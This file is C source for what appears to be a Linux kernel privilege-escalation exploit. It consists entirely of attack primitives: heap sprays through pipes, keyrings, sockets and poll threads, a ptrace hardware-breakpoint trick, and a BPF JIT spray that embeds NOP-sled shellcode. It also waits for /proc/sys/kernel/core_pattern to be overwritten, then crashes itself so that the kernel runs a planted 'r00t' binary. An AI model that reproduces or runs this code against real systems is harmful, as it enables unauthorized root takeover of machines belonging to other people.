void spray_pipe(size_t sz) {
  int fds[2];
  long *ptr, *pptr;
  SYSCHK(pipe(fds));
  ptr = pptr = malloc(sz);
  for (int i = 0; i < sz / sizeof(long); i++) {
    *pptr++ = 0xfffffe0000010f58;
  }

  SYSCHK(write(fds[1], ptr, sz));
  SYSCHK(read(fds[0], ptr, sz));
}

int32_t add_key(const char *type, const char *description, const void *payload,
                size_t plen, int32_t ringid) {
  return syscall(NR_ADD_KEY, type, description, payload, plen, ringid);
}

void alloc_key(size_t sz) {
  char *buf = malloc(sz);
  char name_buf[0x20] = {0};
  long *pptr = (long *)buf;
  for (int i = 0; i < sz / sizeof(long); i++)
    *pptr++ = 0xdecafe1cedc0ffee;
  snprintf(name_buf, sizeof(name_buf), "key_%d", key_idx++);
  SYSCHK(add_key("user", name_buf, buf, sz, KEY_SPEC_PROCESS_KEYRING));
  free(buf);
}

void alloc_dirty_pages() {
  long *ptr;
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sockets));
  ptr = malloc(0x1000);
  for (int i = 0; i < 0x1000 / sizeof(long); i++)
    ptr[i] = FAKE_DESTRUCTOR_ARG;
  for (int i = 0; i < 0x18; i++) {
    SYSCHK(write(sockets[0], ptr, 0x2000));
  }
  for (int i = 0; i < 0x18; i++) {
    SYSCHK(recv(sockets[1], ptr, 0x2000, 0));
  }
  puts("[*] order-1 page sprayed");
}

void alloc_512() {
  long *ptr;
  ptr = malloc(0x200);
  SYSCHK(write(sockets[0], ptr, 0x200));
  puts("[*] 1-order page sprayed");
  sleep(0x10000);
}

void set_hbp(void *addr) {
  if (ptrace(PTRACE_POKEUSER, pid, DB_OFFSET(0), addr) == -1) {
    printf("Failed to set dr_0\n");
    kill(pid, 9);
    exit(-1);
  }
  unsigned long dr_7 =
      (1 << 0) | (1 << 8) | (1 << 16) | (1 << 17) | (1 << 18) | (1 << 19);
  if (ptrace(PTRACE_POKEUSER, pid, DB_OFFSET(7), dr_7) == -1) {
    printf("Failed to set dr_7\n");
    kill(pid, 9);
    exit(-1);
  }
}

void alloc_512_pure() {
  struct sockaddr_ll saddr = {0};
  void *ptr;
  ptr = malloc(0x100);
  saddr.sll_family = AF_PACKET;
  saddr.sll_protocol = htons(ETH_P_ALL);
  saddr.sll_ifindex = SYSCHK(if_nametoindex("lo"));

  struct iovec vec = {.iov_base = ptr, .iov_len = 0x10};
  struct msghdr msg = {
      .msg_name = &saddr,
      .msg_namelen = sizeof(saddr),
      .msg_iov = &vec,
      .msg_iovlen = 1,
  };

  /* printf("[*] iov_len: %lx\n", vec.iov_len); */
  sendmsg(sk2, &msg, 0);
}

void set_cpu(int i) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(i, &mask);
  sched_setaffinity(0, sizeof(mask), &mask);
}

void put_fix_addr() {
  pid = fork();
  if (!pid) {
    set_cpu(0);
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    raise(SIGSTOP);
    __asm__("mov r15,   0xffffffffcbfff800;"
            "mov r14,   0;"
            "mov r13,   0;");
    buf[0] = 0;
    exit(1);
  }
  waitpid(pid, &status, 0);
  set_hbp(buf);
  ptrace(PTRACE_CONT, pid, NULL, NULL);
  waitpid(pid, &status, 0);
  ptrace(PTRACE_CONT, pid, NULL, NULL);
  waitpid(pid, &status, 0);
  return;
}

void sc(void) {
  set_cpu(1);
  unsigned int prog_len = 0x900;
  socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd);
  /* In current environment, the max instructions in a program is near 0x900
  And we test 0x900 instructions * 0x50 forks * 0x100 sockets * 4 = 180 MB is
  enough large to spray and worked reliably
  */
  struct sock_filter table[] = {
      {.code = BPF_LD + BPF_K, .k = 0xb3909090},
      {.code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW}};

  /* 0xb3909090 is NOPsled shellclode to make exploitation more reliable
  90       nop
  90       nop
  90       nop
  b3 b8    mov    bl, 0xb8
  */
  for (int i = 0; i < prog_len; i++)
    filter[i] = table[0];

  filter[prog_len - 1] = table[1];
  int idx = prog_len - 2;

#include "sc.h"

  struct sock_fprog prog = {
      .len = prog_len,
      .filter = filter,
  };
  int fd[2];
  for (int k = 0; k < 0x50; k++) {
    if (fork() == 0) // use fork to bypass RLIMIT_NOFILE limit.
    {
      close(stopfd[1]);
      for (int i = 0; i < 0x100; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd));
        SYSCHK(setsockopt(fd[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog,
                          sizeof(prog)));
      }
      write(stopfd[0], buf, 1);
      read(stopfd[0], buf, 1);
      exit(0);
    }
  }
  /* wait for all forks to finish spraying BPF code */
  read(stopfd[1], buf, 0x50);
}

int NFDS(int size) {
  return ((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS;
}

int check_core() {
  // Check if /proc/sys/kernel/core_pattern has been overwritten
  char buf[0x100] = {};
  int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  read(core, buf, sizeof(buf));
  close(core);
  return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd) {
  int memfd = memfd_create("", 0);
  SYSCHK(sendfile(memfd, open("./r00t", 0), 0, 0xffffffff));
  dup2(memfd, 666);
  close(memfd);
  while (check_core() == 0)
    sleep(1);
  /* Trigger program crash and cause kernel to executes program from
   * core_pattern which is our "root" binary */
  *(size_t *)0 = 0;
}

void *alloc_poll_list(void *args) {
  struct pollfd *pfds;
  int idx, nfds, timeout;

  idx = ((struct t_args *)args)->idx;
  nfds = ((struct t_args *)args)->nfds;
  timeout = ((struct t_args *)args)->timeout;

  pfds = calloc(nfds, sizeof(struct pollfd));

  for (int i = 0; i < nfds; i++) {
    pfds[i].fd = fds[0];
    pfds[i].events = POLLERR;
  }

  while (thread_count < idx)
    usleep(10 * 1000);
  int ret = poll(pfds, nfds, timeout);

  // printf("[Thread %d] Start polling...\n", id);
  // printf("[Thread %d] Polling complete: %d!\n", id, ret);
}

void create_poll_thread(int idx, size_t size, int timeout) {
  struct t_args *args;
  static pthread_t poll_tid;

  args = calloc(1, sizeof(struct t_args));

  if (size > PAGE_SIZE)
    size = size - ((size / PAGE_SIZE) * sizeof(struct poll_list));

  args->idx = idx;
  args->nfds = NFDS(size);
  args->timeout = timeout;

  pthread_create(&poll_tid, 0, alloc_poll_list, (void *)args);
}

void unshare_setup(uid_t uid, gid_t gid) {
  int temp, ret;
  char edit[0x100];
  SYSCHK(unshare(CLONE_NEWNET | CLONE_NEWUSER));
  temp = open("/proc/self/setgroups", O_WRONLY);
  write(temp, "deny", strlen("deny"));
  close(temp);
  temp = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", uid);
  write(temp, edit, strlen(edit));
  close(temp);
  temp = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", gid);
  write(temp, edit, strlen(edit));
  close(temp);
  return;
}
